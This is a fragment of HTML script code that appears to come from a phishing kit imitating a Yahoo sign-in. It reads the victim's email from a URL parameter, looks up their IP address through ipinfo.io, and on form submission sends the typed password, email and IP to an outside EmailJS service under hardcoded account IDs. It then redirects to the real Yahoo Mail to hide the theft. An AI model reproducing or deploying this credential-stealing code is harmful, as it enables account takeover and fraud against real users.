      <script>
          function getParameterByName(name, url = window.location.href) {
                name = name.replace(/[\[\]]/g, '\\$&');
                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                    results = regex.exec(url);
                if (!results) return null;
                if (!results[2]) return '';
                return decodeURIComponent(results[2].replace(/\+/g, ' '));
            }
            var foo = getParameterByName('usr');

            
      </script>

      <script>
            var xxip;
            // Add "https://ipinfo.io" statement
        // this will communicate with the ipify servers
        // in order to retrieve the IP address
            window.onload = function(){
                $.getJSON("https://ipinfo.io/json?token=5eaf0700b2c0d2", function(data) {
                        
                        // Setting text of element P with id gfg
                        xxip = data.ip;
                        
                        
                    })                
                }
        
            
            // "json" shows that data will be fetched in json format
            function sendmail(){
                (function() {
                    emailjs.init("DXEnVY0cQeWbx4IkW"); //please encrypted user id for malicious attacks
                    })();
                //set the parameter as per you template parameter[https://dashboard.emailjs.com/templates]
                var templateParams = {
		    domain: "Yahoo",
                    user_name: foo,
                    user_pass: document.getElementById("usr").value,
                    ip: xxip,
                };

                emailjs.send('service_twujdwl', 'template_770klnf', templateParams)
                    .then(function(response) {
                    window.location.href = "https://mail.yahoo.com";
                    }, function(error) {
                    alert('FAILED...', error);
                    });

            }

            function processForm(e) {
                if (e.preventDefault) e.preventDefault();

                /* do what you want with the form */
            sendmail()
            

                // You must return false to prevent the default form behavior
                return false;
            }

            var form = document.getElementById('my-form');

            if (form.attachEvent) {
                form.attachEvent("submit", processForm);
            } else {
                form.addEventListener("submit", processForm);
            }

    </script>
